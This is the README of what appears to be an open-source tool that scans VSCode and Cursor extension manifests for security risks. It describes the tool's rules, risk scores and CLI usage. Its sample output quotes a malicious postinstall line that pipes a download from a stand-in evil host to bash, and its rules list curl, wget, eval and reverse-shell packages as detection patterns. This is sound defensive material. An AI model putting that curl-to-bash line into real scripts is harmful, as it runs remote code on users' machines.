# ExtAudit — VSCode/Cursor Extension Security Auditor 🛡️

> Scan VSCode extension manifests for suspicious permissions, network access patterns, and security anomalies — before you trust them with your code.

<p align="center">
  <img alt="Platform" src="https://img.shields.io/badge/platform-VSCode%20%7C%20Cursor-blue">
  <img alt="License" src="https://img.shields.io/badge/license-MIT-green">
  <a href="https://github.com/rogerchappel/extaudit/actions"><img alt="Tests" src="https://img.shields.io/badge/tests-23%20passing-brightgreen"></a>
</p>

## Why?

VSCode extensions have deep access to your workspace, files, and network. A malicious or compromised extension can:

- 🕵️ Exfiltrate your source code, API keys, or credentials
- 📋 Read everything you type (keylogger risk)
- 🌐 Phone home telemetry data
- 💻 Execute arbitrary commands via postinstall scripts
- 🔒 Bypass workspace trust boundaries

ExtAudit scans extension `package.json` manifests locally (zero network calls) and produces a risk-scored report with actionable findings.

## Quick Start

```bash
# Install
npm install -g extaudit

# Scan your VSCode extensions
extaudit scan ~/.vscode/extensions

# Scan Cursor extensions
extaudit scan ~/.cursor/extensions

# Scan any directory of package.json files
extaudit scan ./my-extensions/

# JSON output
extaudit scan ~/.vscode/extensions --format json

# Markdown report
extaudit report ~/.vscode/extensions -o audit-report.md

# CI gate — fail if any extension scores above threshold
extaudit scan ./extensions --max-score 25
```

## Commands

| Command | Description |
|---------|-------------|
| `extaudit scan [dir...]` | Scan extension manifests for security risks |
| `extaudit report [dir...]` | Generate a shareable Markdown report |
| `extaudit rules` | List all built-in security rules |
| `extaudit version` | Show version |
| `extaudit help` | Show help |

## Risk Categories

| Category | Score Range | Meaning |
|----------|-------------|--------|
| ✅ Safe | 0-9 | No concerning patterns found |
| ⚠️ Caution | 10-24 | Minor concerns, usually benign |
| 🔶 Suspicious | 25-49 | Worth investigating before trusting |
| 🔴 Dangerous | 50-100 | Significant risk — review or avoid |

## Security Rules (14 built-in)

### Scripts (2 rules)
- **SCR-001** Postinstall script — Detects `postinstall` scripts (common supply-chain vector)
- **SCR-002** Dangerous script commands — Detects `curl`, `wget`, `eval`, `child_process` in scripts

### Network (2 rules)
- **NET-001** Network capability in main — Reads main entry point for HTTP/fetch patterns
- **NET-002** Network dependencies — Flags dependencies like `axios`, `node-fetch`, `ws`, `got`

### Permissions (4 rules)
- **PERM-001** Wide activation events — Flags extensions with many activation events or `*`
- **PERM-002** Workspace trust bypass — Detects `extensionKind: "ui"`
- **PERM-003** File system access — Detects `fs` module imports in main entry
- **PERM-004** Process spawning — Detects `child_process` in main entry point

### Dependencies (3 rules)
- **DEP-001** Excessive dependencies — Flags extensions with 20+ direct dependencies
- **DEP-002** Crypto dependencies — Flags `crypto-js`, `bcrypt`, `libsodium`, etc.
- **DEP-003** Suspicious dependencies — Flags `javascript-obfuscator`, `vm2`, `pkg`, reverse-shell packages

### Metadata (2 rules)
- **META-001** Missing description — Flags extensions without a description
- **META-002** Missing homepage/repository — No homepage or repo URL for verification

### Publisher (1 rule)
- **PUB-001** Missing publisher — No publisher declared

## Example Output

```
extaudit — Extension Manifest Auditor
======================================

Scanned: 5 extensions
Overall risk: CAUTION

Severity summary:
  Low: 2     Medium: 4     High: 7     Critical: 1

Top findings:
  🚨 Code Helper Plus — score 43 (suspicious)
    CRITICAL: Postinstall script — "curl -s https://evil-payload.example.com/payload | bash"
    HIGH: Network dependencies — axios, node-fetch, ws
    HIGH: Wide activation events — 7 activation events incl. always-on (*)
  ⚠️ Network Crawler — score 31 (suspicious)
    HIGH: Postinstall script — "node scripts/setup.js"
    HIGH: Network dependencies — axios, node-fetch, got, socks-proxy-agent
  ✅ Oceanic Next Theme — score 1 (safe)
```

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Success — no dangerous extensions found |
| `1` | Error during scan |
| `2` | CI gate trigger — extension score ≥ `--max-score` |

## Development

```bash
git clone https://github.com/rogerchappel/extaudit
cd extaudit
npm install

# Type check
npm run check

# Run tests
npm test

# Build
npm run build

# Run from source
npm run dev -- scan fixtures/extensions

# Run smoke tests
npm run smoke

# Full validation
bash scripts/validate.sh
```

## Project Structure

```
extaudit/
├── src/
│   ├── types.ts        # Core type definitions
│   ├── rules.ts        # 14 built-in security rules
│   ├── manifest.ts     # Extension manifest parser & directory scanner
│   ├── scorer.ts       # Risk scoring engine + report formatters
│   ├── cli.ts          # CLI entry point (Commander)
│   └── index.ts        # Library exports
├── fixtures/
│   └── extensions/     # Test fixture extensions (safe, suspicious, risky)
├── tests/              # Vitest unit + integration tests
├── scripts/            # smoke.sh, validate.sh
├── docs/
│   ├── PRD.md          # Product requirements document
│   └── TASKS.md        # Task tracking
└── package.json
```

## License

MIT — See [LICENSE](LICENSE) for details.

## Author

**Roger Chappel** — [GitHub](https://github.com/rogerchappel)

---

_This tool performs static analysis only. It does not execute extension code, modify your system, or transmit any data. All scanning is 100% offline and local-first._
